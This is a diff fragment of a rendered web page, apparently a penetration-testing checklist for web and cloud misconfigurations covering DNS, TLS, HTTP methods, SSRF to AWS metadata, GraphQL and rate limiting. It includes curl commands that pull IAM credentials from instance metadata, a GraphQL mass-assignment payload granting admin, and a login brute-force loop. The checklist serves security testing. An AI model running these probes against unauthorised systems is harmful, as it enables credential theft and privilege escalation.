+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -I -s https://target.com | grep -i set-cookie</span></span></code></pre></div><h3 id="4-email-spf-dkim-dmarc">4. Email (SPF, DKIM, DMARC)<a class="anchor" href="#4-email-spf-dkim-dmarc">#</a></h3>
 <p><strong>What to test:</strong> SPF syntax, DKIM keys, DMARC policy and alignment.</p>
 <p><strong>Manual:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dig TXT target.com
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dig TXT target.com
 </span></span><span style="display:flex;"><span>dig TXT _dmarc.target.com
-</span></span><span style="display:flex;"><span>dig TXT selector._domainkey.target.com
-</span></span></code></pre></div><p><strong>Tools:</strong></p>
+</span></span><span style="display:flex;"><span>dig TXT selector._domainkey.target.com</span></span></code></pre></div><p><strong>Tools:</strong></p>
 <ul>
 <li>MXToolbox, dmarcian, mxtoolbox.com/spf</li>
 <li>EmailSecCheck: <code>python3 emailseccheck.py -d target.com</code></li>
 </ul>
-<h3 id="5-dns-misconfiguration-1">
-  5. DNS Misconfiguration
-  <a class="anchor" href="#5-dns-misconfiguration-1">#</a>
-</h3>
+<h3 id="5-dns-misconfiguration-1">5. DNS Misconfiguration<a class="anchor" href="#5-dns-misconfiguration-1">#</a></h3>
 <p><strong>Zone transfer:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dig axfr @ns.target.com target.com
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dig axfr @ns.target.com target.com
 </span></span><span style="display:flex;"><span>host -l target.com ns.target.com
-</span></span><span style="display:flex;"><span>dnsrecon -d target.com -t axfr
-</span></span></code></pre></div><p><strong>CAA:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dig CAA target.com
-</span></span><span style="display:flex;"><span>nslookup -type<span style="color:#f92672">=</span>CAA target.com
-</span></span></code></pre></div><p><strong>Tools:</strong> dig, nslookup, dnsrecon, fierce.</p>
-<h3 id="6-tlsssl-misconfiguration-1">
-  6. TLS/SSL Misconfiguration
-  <a class="anchor" href="#6-tlsssl-misconfiguration-1">#</a>
-</h3>
+</span></span><span style="display:flex;"><span>dnsrecon -d target.com -t axfr</span></span></code></pre></div><p><strong>CAA:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dig CAA target.com
+</span></span><span style="display:flex;"><span>nslookup -type<span style="color:#f92672">=</span>CAA target.com</span></span></code></pre></div><p><strong>Tools:</strong> dig, nslookup, dnsrecon, fierce.</p>
+<h3 id="6-tlsssl-misconfiguration-1">6. TLS/SSL Misconfiguration<a class="anchor" href="#6-tlsssl-misconfiguration-1">#</a></h3>
 <p><strong>Manual (OpenSSL):</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>openssl s_client -connect target.com:443
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>openssl s_client -connect target.com:443
 </span></span><span style="display:flex;"><span>openssl s_client -connect target.com:443 -tls1
-</span></span><span style="display:flex;"><span>openssl s_client -connect target.com:443 -tls1_1
-</span></span></code></pre></div><p><strong>Tools:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># testssl.sh</span>
+</span></span><span style="display:flex;"><span>openssl s_client -connect target.com:443 -tls1_1</span></span></code></pre></div><p><strong>Tools:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># testssl.sh</span>
 </span></span><span style="display:flex;"><span>./testssl.sh https://target.com
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># sslscan</span>
 </span></span><span style="display:flex;"><span>sslscan target.com
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap</span>
-</span></span><span style="display:flex;"><span>nmap --script ssl-enum-ciphers -p <span style="color:#ae81ff">443</span> target.com
-</span></span></code></pre></div><h3 id="7-http-methods-put-delete">
-  7. HTTP Methods (PUT, DELETE)
-  <a class="anchor" href="#7-http-methods-put-delete">#</a>
-</h3>
+</span></span><span style="display:flex;"><span>nmap --script ssl-enum-ciphers -p <span style="color:#ae81ff">443</span> target.com</span></span></code></pre></div><h3 id="7-http-methods-put-delete">7. HTTP Methods (PUT, DELETE)<a class="anchor" href="#7-http-methods-put-delete">#</a></h3>
 <p><strong>What to test:</strong> Unnecessary or incorrectly-authorized method support on production paths (PUT/DELETE/PATCH), and whether debug/unsafe methods like <code>TRACE</code> are disabled.</p>
 <p><strong>Manual:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Discover supported methods (if allowed)</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Discover supported methods (if allowed)</span>
 </span></span><span style="display:flex;"><span>curl -X OPTIONS https://target.com/
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># PUT (upload/overwrite risk)</span>
@@ -1552,54 +1478,36 @@ https://github.com/alex-shpak/hugo-book
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># PATCH (partial update / Broken Object Level Authorization risk)</span>
 </span></span><span style="display:flex;"><span>curl -X PATCH https://target.com/api/resource/123 <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>-H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>-d <span style="color:#e6db74">&#39;{&#34;field&#34;:&#34;test&#34;}&#39;</span>
+</span></span></span><span style="display:flex;"><span>-H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>-d <span style="color:#e6db74">&#39;{&#34;field&#34;:&#34;test&#34;}&#39;</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># TRACE (must be disabled; can leak headers and enable XST/request reflection)</span>
-</span></span><span style="display:flex;"><span>curl -i -X TRACE https://target.com/ -H <span style="color:#e6db74">&#34;X-Test: 123&#34;</span>
-</span></span></code></pre></div><p><strong>Expected :</strong></p>
+</span></span><span style="display:flex;"><span>curl -i -X TRACE https://target.com/ -H <span style="color:#e6db74">&#34;X-Test: 123&#34;</span></span></span></code></pre></div><p><strong>Expected :</strong></p>
 <ul>
 <li>For unauthorized objects/actions: expect <code>401/403</code> (not <code>2xx</code>)</li>
 <li>For disallowed methods: expect <code>405 Method Not Allowed</code> (or <code>400</code>), not success</li>
 <li>For <code>TRACE</code>: you should not get an echoed full request back in the response body (TRACE can enable Cross-Site Tracing / information disclosure chains: see OWASP Cross-Site Tracing and PortSwigger TRACE method enabled)</li>
 </ul>
 <p><strong>Tools:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Burp Suite, Nuclei (http/misconfiguration/)</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># OWASP/WSTG-style method discovery/testing (includes PUT/DELETE/PATCH/TRACE testing objectives: OWASP WSTG Test HTTP Methods)</span>
-</span></span></code></pre></div><h3 id="8-server-banner--version-disclosure">
-  8. Server Banner &amp; Version Disclosure
-  <a class="anchor" href="#8-server-banner--version-disclosure">#</a>
-</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Burp Suite, Nuclei (http/misconfiguration/)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># OWASP/WSTG-style method discovery/testing (includes PUT/DELETE/PATCH/TRACE testing objectives: OWASP WSTG Test HTTP Methods)</span></span></span></code></pre></div><h3 id="8-server-banner--version-disclosure">8. Server Banner &amp; Version Disclosure<a class="anchor" href="#8-server-banner--version-disclosure">#</a></h3>
 <p><strong>Manual:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -I https://target.com
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -I https://target.com
 </span></span><span style="display:flex;"><span>nc target.com <span style="color:#ae81ff">80</span>
 </span></span><span style="display:flex;"><span>nmap -sV -p 80,443 target.com
-</span></span><span style="display:flex;"><span>whatweb https://target.com
-</span></span></code></pre></div><p><strong>Look for:</strong> Server, X-Powered-By, X-AspNet-Version, X-Generator, X-Drupal-Cache.</p>
-<h3 id="9-default-pages--directory-listing">
-  9. Default Pages &amp; Directory Listing
-  <a class="anchor" href="#9-default-pages--directory-listing">#</a>
-</h3>
+</span></span><span style="display:flex;"><span>whatweb https://target.com</span></span></code></pre></div><p><strong>Look for:</strong> Server, X-Powered-By, X-AspNet-Version, X-Generator, X-Drupal-Cache.</p>
+<h3 id="9-default-pages--directory-listing">9. Default Pages &amp; Directory Listing<a class="anchor" href="#9-default-pages--directory-listing">#</a></h3>
 <p><strong>What to test:</strong> Default Nginx/IIS/Apache pages, <code>index.html</code>, directory listing.</p>
 <p><strong>Manual:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Browse /, /index.html, common paths like /admin, /backup, /config.
-</span></span></code></pre></div><p><strong>Tools:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Dirbuster, gobuster, ffuf, Nuclei.
-</span></span></code></pre></div><h3 id="10-backup--config-files">
-  10. Backup &amp; Config Files
-  <a class="anchor" href="#10-backup--config-files">#</a>
-</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Browse /, /index.html, common paths like /admin, /backup, /config.</span></span></code></pre></div><p><strong>Tools:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Dirbuster, gobuster, ffuf, Nuclei.</span></span></code></pre></div><h3 id="10-backup--config-files">10. Backup &amp; Config Files<a class="anchor" href="#10-backup--config-files">#</a></h3>
 <p><strong>What to test:</strong> <code>.bak</code>, <code>.old</code>, <code>.swp</code>, <code>config.json</code>, <code>.env</code>, <code>web.config.bak</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -u https://target.com/FUZZ -w wordlist.txt
-</span></span><span style="display:flex;"><span>gobuster dir -u https://target.com -w /path/to/wordlist
-</span></span></code></pre></div><h3 id="11-cloud-metadata-hunting">
-  <strong>11. Cloud-Metadata Hunting</strong>
-  <a class="anchor" href="#11-cloud-metadata-hunting">#</a>
-</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -u https://target.com/FUZZ -w wordlist.txt
+</span></span><span style="display:flex;"><span>gobuster dir -u https://target.com -w /path/to/wordlist</span></span></code></pre></div><h3 id="11-cloud-metadata-hunting"><strong>11. Cloud-Metadata Hunting</strong><a class="anchor" href="#11-cloud-metadata-hunting">#</a></h3>
 <p><strong>What to test:</strong></p>
 <p>SSRF-style paths and misrouting that allow the server to reach instance metadata endpoints (commonly AWS IMDS) and then obtain IAM credentials/metadata. Then check whether those credentials can be used for any <strong>read/write</strong> action in cloud (depends on IAM role permissions).</p>
 <p><strong>Manual:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>1<span style="color:#f92672">)</span> Identify SSRF entry points <span style="color:#f92672">(</span>typical<span style="color:#f92672">)</span>: URL fetch, image import, webhook URL, debug download, proxy fetch
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>1<span style="color:#f92672">)</span> Identify SSRF entry points <span style="color:#f92672">(</span>typical<span style="color:#f92672">)</span>: URL fetch, image import, webhook URL, debug download, proxy fetch
 </span></span><span style="display:flex;"><span><span style="color:#75715e">#  Try sending a target that resolves to link-local metadata IPs.</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>2<span style="color:#f92672">)</span> AWS IMDSv1 / IMDSv2 reachability checks
@@ -1607,22 +1515,17 @@ https://github.com/alex-shpak/hugo-book
 </span></span><span style="display:flex;"><span>curl -s http://169.254.169.254/latest/meta-data/instance-id
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># IMDSv2 (requires token)</span>
 </span></span><span style="display:flex;"><span>TOKEN<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>curl -s -X PUT <span style="color:#e6db74">&#34;http://169.254.169.254/latest/api/token&#34;</span> <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>-H <span style="color:#e6db74">&#34;X-aws-ec2-metadata-token-ttl-seconds: 21600&#34;</span><span style="color:#66d9ef">)</span>
+</span></span></span><span style="display:flex;"><span>-H <span style="color:#e6db74">&#34;X-aws-ec2-metadata-token-ttl-seconds: 21600&#34;</span><span style="color:#66d9ef">)</span>
 </span></span><span style="display:flex;"><span>curl -s -H <span style="color:#e6db74">&#34;X-aws-ec2-metadata-token: </span>$TOKEN<span style="color:#e6db74">&#34;</span> <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>http://169.254.169.254/latest/meta-data/iam/security-credentials/
-</span></span></code></pre></div><p><strong>Expected :</strong></p>
+</span></span></span><span style="display:flex;"><span>http://169.254.169.254/latest/meta-data/iam/security-credentials/</span></span></code></pre></div><p><strong>Expected :</strong></p>
 <ul>
 <li>If metadata endpoints respond, you can usually enumerate IAM role names and attempt credential access.</li>
 <li>If credentials are available and the role has write permissions, you may be able to <strong>upload/write to storage</strong>, <strong>start instances</strong>, <strong>modify security groups</strong>, or <strong>access additional secrets</strong>.</li>
 </ul>
 <p><strong>Tools:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Burp Suite <span style="color:#f92672">(</span>proxy + Repeater to inject SSRF URLs<span style="color:#f92672">)</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Burp Suite <span style="color:#f92672">(</span>proxy + Repeater to inject SSRF URLs<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span>curl / httpie <span style="color:#f92672">(</span>metadata probing<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>Tools <span style="color:#66d9ef">for</span> SSRF/metadata context: InternalAllTheThings AWS metadata
-</span></span></code></pre></div><h3 id="12-api--access-control-misconfiguration-graphql-introspection-mass-assignment-overly-permissive-keys">
-  <strong>12. API &amp; Access Control Misconfiguration (GraphQL Introspection, Mass Assignment, Overly-Permissive Keys)</strong>
-  <a class="anchor" href="#12-api--access-control-misconfiguration-graphql-introspection-mass-assignment-overly-permissive-keys">#</a>
-</h3>
+</span></span><span style="display:flex;"><span>Tools <span style="color:#66d9ef">for</span> SSRF/metadata context: InternalAllTheThings AWS metadata</span></span></code></pre></div><h3 id="12-api--access-control-misconfiguration-graphql-introspection-mass-assignment-overly-permissive-keys"><strong>12. API &amp; Access Control Misconfiguration (GraphQL Introspection, Mass Assignment, Overly-Permissive Keys)</strong><a class="anchor" href="#12-api--access-control-misconfiguration-graphql-introspection-mass-assignment-overly-permissive-keys">#</a></h3>
 <p><strong>What to test:</strong></p>
 <ul>
 <li>GraphQL introspection enabled in production (schema discovery)</li>
@@ -1631,41 +1534,36 @@ https://github.com/alex-shpak/hugo-book
 <li>Authorization drift between queries vs mutations and between “UI allowed fields” vs actual server input</li>
 </ul>
 <p><strong>Manual:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>1<span style="color:#f92672">)</span> Confirm introspection
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>1<span style="color:#f92672">)</span> Confirm introspection
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># (Try in the GraphQL endpoint; commonly POST /graphql)</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Minimal introspection probe:</span>
 </span></span><span style="display:flex;"><span>curl -s -X POST https://target.com/graphql <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>-H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>--data <span style="color:#e6db74">&#39;{&#34;query&#34;:&#34;{ __schema { queryType { name } } }&#34;}&#39;</span>
+</span></span></span><span style="display:flex;"><span>-H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>--data <span style="color:#e6db74">&#39;{&#34;query&#34;:&#34;{ __schema { queryType { name } } }&#34;}&#39;</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>2<span style="color:#f92672">)</span> Enumerate mutations/fields from schema <span style="color:#f92672">(</span><span style="color:#66d9ef">then</span> target authz gaps<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Use the discovered mutation arguments/inputs and try injecting extra fields.</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Example pattern (mass assignment attempt):</span>
 </span></span><span style="display:flex;"><span>curl -s -X POST https://target.com/graphql <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>-H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>-H <span style="color:#e6db74">&#34;Authorization: Bearer &lt;token&gt;&#34;</span> <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>--data <span style="color:#e6db74">&#39;{
+</span></span></span><span style="display:flex;"><span>-H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>-H <span style="color:#e6db74">&#34;Authorization: Bearer &lt;token&gt;&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>--data <span style="color:#e6db74">&#39;{
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;query&#34;:&#34;mutation UpdateUser($input: UpdateUserInput!) { updateUser(input: $input) { id role } }&#34;,
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;variables&#34;:{
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;input&#34;:{
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;id&#34;:&#34;&lt;victimOrOwnId&gt;&#34;,
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;role&#34;:&#34;admin&#34;,
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;isSuperUser&#34;:true}}
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">}&#39;</span>
-</span></span></code></pre></div><p><strong>Expected :</strong></p>
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">}&#39;</span></span></span></code></pre></div><p><strong>Expected :</strong></p>
 <ul>
 <li>Introspection should be disabled or restricted; if enabled, it accelerates exploitation.</li>
 <li>If mutation accepts unauthorized fields or object IDs, you can often escalate privileges (BOLA/mass assignment style).</li>
 </ul>
 <p><strong>Tools:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Burp Suite <span style="color:#f92672">(</span>GraphQL requests in Repeater<span style="color:#f92672">)</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Burp Suite <span style="color:#f92672">(</span>GraphQL requests in Repeater<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span>GraphQL testing guidance:
 </span></span><span style="display:flex;"><span>- OWASP WSTG GraphQL testing
-</span></span><span style="display:flex;"><span>- PortSwigger GraphQL
-</span></span></code></pre></div><h3 id="13-rate-limiting--caching-misconfiguration">
-  13. Rate Limiting &amp; Caching Misconfiguration
-  <a class="anchor" href="#13-rate-limiting--caching-misconfiguration">#</a>
-</h3>
+</span></span><span style="display:flex;"><span>- PortSwigger GraphQL</span></span></code></pre></div><h3 id="13-rate-limiting--caching-misconfiguration">13. Rate Limiting &amp; Caching Misconfiguration<a class="anchor" href="#13-rate-limiting--caching-misconfiguration">#</a></h3>
 <p><strong>What to test:</strong></p>
 <ul>
 <li>Missing/weak rate limits (by endpoint, by user, by IP, by token)</li>
@@ -1675,32 +1573,27 @@ https://github.com/alex-shpak/hugo-book
 <li>Missing/incorrect <code>Cache-Control</code>, <code>Pragma</code>, <code>Vary</code>, <code>no-store</code> directives on auth-sensitive endpoints</li>
 </ul>
 <p><strong>Manual:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>1<span style="color:#f92672">)</span> Rate limiting checks <span style="color:#f92672">(</span>authentication + enumeration endpoints<span style="color:#f92672">)</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>1<span style="color:#f92672">)</span> Rate limiting checks <span style="color:#f92672">(</span>authentication + enumeration endpoints<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Try varying identifiers (user id/email/resource id) and observe throttling behavior.</span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i in <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">4</span> 5; <span style="color:#66d9ef">do</span>
 </span></span><span style="display:flex;"><span>curl -s -X POST https://target.com/api/login <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>-H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>--data <span style="color:#e6db74">&#34;{\&#34;email\&#34;:\&#34;user</span><span style="color:#e6db74">${</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">@test.com\&#34;,\&#34;password\&#34;:\&#34;wrong\&#34;}&#34;</span> <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>-D - | head -n <span style="color:#ae81ff">20</span>
+</span></span></span><span style="display:flex;"><span>-H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>--data <span style="color:#e6db74">&#34;{\&#34;email\&#34;:\&#34;user</span><span style="color:#e6db74">${</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">@test.com\&#34;,\&#34;password\&#34;:\&#34;wrong\&#34;}&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>-D - | head -n <span style="color:#ae81ff">20</span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>2<span style="color:#f92672">)</span> Cache header validation <span style="color:#f92672">(</span>sensitive endpoints<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span>curl -s -I https://target.com/api/me
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Look for: Cache-Control: no-store (or similarly strict policy) + correct Vary usage</span>
-</span></span></code></pre></div><p><strong>Expected :</strong></p>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Look for: Cache-Control: no-store (or similarly strict policy) + correct Vary usage</span></span></span></code></pre></div><p><strong>Expected :</strong></p>
 <ul>
 <li>Auth bypass chains: brute-force/enumeration that should be throttled keeps succeeding.</li>
 <li>Cache misconfig: sensitive responses appear in cache and are replayed across sessions/users (or served after auth changes).</li>
 <li>OWASP guidance expects proper cache headers for sensitive content. See: Cache poisoning</li>
 </ul>
 <p><strong>Tools:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Burp Suite <span style="color:#f92672">(</span>Repeater + custom headers; concurrency tests<span style="color:#f92672">)</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Burp Suite <span style="color:#f92672">(</span>Repeater + custom headers; concurrency tests<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span>Reference <span style="color:#66d9ef">for</span> rate limiting expectations: OWASP API Security - Lack of Resources &amp; Rate Limiting
-</span></span><span style="display:flex;"><span>Reference <span style="color:#66d9ef">for</span> cache poisoning/misconfig behavior: OWASP Cache Poisoning
-</span></span></code></pre></div><h3 id="14-running-with-elevated-privileges--session-misconfiguration-session-fixation--cookie-theft--blast-radius">
-  <strong>14. Running With Elevated Privileges &amp; Session Misconfiguration (Session Fixation / Cookie Theft / Blast Radius)</strong>
-  <a class="anchor" href="#14-running-with-elevated-privileges--session-misconfiguration-session-fixation--cookie-theft--blast-radius">#</a>
-</h3>
